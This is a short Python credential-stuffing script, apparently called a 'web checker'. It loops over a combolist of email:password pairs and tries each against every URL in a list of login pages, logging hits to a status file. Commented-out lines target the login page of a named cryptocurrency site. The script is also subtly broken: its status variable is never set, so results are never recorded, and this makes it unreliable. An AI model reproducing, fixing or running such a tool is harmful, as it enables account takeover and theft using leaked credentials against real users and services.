import requests
from modes.Checker  import check

status=''
count=0

print('''*****************************THIS IS HUCKS APPS- WEB CHECKER ALL************************************
 ***************************Read instruction properly for use********************************************
 ''')

comboStatus = input('pls copy & paste d combolist in d comboList file in d list folder and  ...type OK if done: ')
urlStatus = input('pls copy & paste d login-Url in d urlList file in d list folder and  ...type OK if done: ')
with open('./lists/comboList.txt', 'r') as emailPass:
    combo_list = emailPass.readlines()
    for combo in combo_list:
        arg = combo.split(':')
        email = arg[0]
        password = arg[1]
        with open('./lists/urlList.txt', 'r') as urls:
            url_list = urls.readlines()
            for url in url_list:
                check(url=url, email=email, password=password)
                if status != "":
                    print(f'this is the email {email}, this is password {password}, this the url {url}')
                    with open('./lists/status.txt', 'a') as stat:
                        stat.write(f'log  {email}, {password}, {url}, {status}......')
print('''*************************DONE!!!!!!!!!!!********Check the lists folder and status file to view results***** ''')











#res = requests.post('https://buycoinnow.com/login', auth=(login_email, login_password), verify=True)
##print(res.headers['Content-Type'],res.status_code)


#with requests.Session() as session:
   # res = session.post('https://buycoinnow.com/login', auth=(login_email, login_password), verify=False)

#print(res.status_code, res.headers['content-type'], res.headers)



